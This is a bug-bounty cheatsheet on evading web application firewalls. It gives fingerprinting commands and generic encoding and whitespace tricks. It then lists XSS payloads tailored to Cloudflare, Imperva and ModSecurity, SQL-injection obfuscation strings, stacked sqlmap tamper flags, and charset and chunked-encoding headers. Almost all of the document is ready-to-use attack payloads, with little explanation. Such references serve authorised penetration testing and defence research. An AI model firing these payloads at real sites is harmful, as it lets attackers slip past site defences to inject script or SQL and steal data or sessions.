---
tags: [bugbounty, bypass/waf, cheatsheet]
aliases: [WAF Bypass, Web Application Firewall Bypass]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# WAF Bypass Techniques

> [!tldr] Hunter Summary
> **What:** Evade WAF signature detection to land payloads.
> **Key principle:** WAFs match signatures. Encoding, whitespace, case, and syntax variation bypasses pattern matching.
> **Approach:** Identify WAF (error messages, cookies), find blind spots, apply targeted bypasses.

---

## Identify the WAF

```bash
wafw00f https://target.com
# Or: check response headers for: Server, X-CDN, X-Cache, X-Guard, X-Firewall
# Cloudflare: CF-RAY header, __cfduid cookie
# AWS WAF: x-amzn-RequestId, x-amz-cf-id  
# Imperva: visid_incap cookie, incap_ses cookie
# Akamai: AkamaiGHost, X-Check-Cacheable
# F5 BigIP: BigIP, F5 error page template
```

---

## Universal Bypass Techniques

### 1 — Case variation
```
<ScRiPt>alert(1)</sCrIpT>
UNION SELECT  →  uNiOn SeLeCt
```

### 2 — URL encoding
```
<script> → %3Cscript%3E
/ → %2f  .  → %2e  @ → %40
Double: % → %25  so / → %252f
```

### 3 — Whitespace substitution
```sql
-- SQL: spaces → comments or special chars
UNION/**/SELECT
UNION%09SELECT    (tab)
UNION%0aSELECT    (newline)
UNION%0dSELECT    (carriage return)
UNION%0bSELECT    (vertical tab)
```

### 4 — Comment insertion
```sql
UN/**/ION SE/**/LECT
SEL/**/ECT
```

### 5 — Null bytes
```
<scr%00ipt>alert(1)</script>
<?p%00hp phpinfo(); ?>
```

### 6 — Unicode normalization
```
＜script＞  (fullwidth brackets)
ﾀscript>
```

---

## Cloudflare Bypasses

```html
<!-- XSS -->
<svg%0Aonauxclick=0;[1].some(confirm)//
<svg/onload={alert`1`}>
"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
<--`<img/src=` onerror=confirm``> --!>
Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
<svg onload=alert%26%230000000040"1")>
<video onnull=null onmouseover=confirm(1)>

<!-- SQLi -->
AND 1=1#  →  aNd/**/%31=%31%23
UNION SELECT  →  /*!UNION*/ /*!SELECT*/
```

---

## Imperva / Incapsula Bypasses

```html
<x/onclick=globalThis['pro'+'mpt']&lt;)>clickme
<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
<svg onload\r\n=$.globalEval("al"+"ert()");>
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```

---

## ModSecurity Bypasses

```html
<a href="jav%0Dascript&colon;alert(1)">click
```

```sql
-- SQLi bypass
1 AND 1=1
1 /*!AND*/ 1=1
1 AND/**/ 1=1
```

---

## sqlmap WAF Tamper Scripts

```bash
# Space to comment
sqlmap --tamper=space2comment

# Multiple tampers combined
sqlmap --tamper=space2comment,between,randomcase,charunicodeencode

# Full WAF bypass combo
sqlmap -u "URL" --tamper=apostrophemask,apostrophenullencode,base64encode,between,\
chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,\
ifnull2ifisnull,multiplespaces,randomcase,space2comment,space2dash

# Useful tampers:
# apostrophemask    → ' → %EF%BC%87 (UTF-8 fullwidth apostrophe)
# base64encode      → base64-encodes payloads  
# between           → > → NOT BETWEEN 0 AND #
# charunicodeencode → unicode escaping
# equaltolike       → = → LIKE
# randomcase        → random case in keywords
# space2comment     → space → /**/
# space2dash        → space → -- \n
```

---

## Headers That Confuse WAFs

```http
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Type: application/json;charset=UTF-7
Transfer-Encoding: chunked
X-Custom-Header: bypass
```

---

## References

- Awesome-WAF — https://github.com/0xInfection/Awesome-WAF
- sqlmap tamper scripts — https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- Hacktricks WAF bypass — https://book.hacktricks.xyz/pentesting-web/waf-bypass
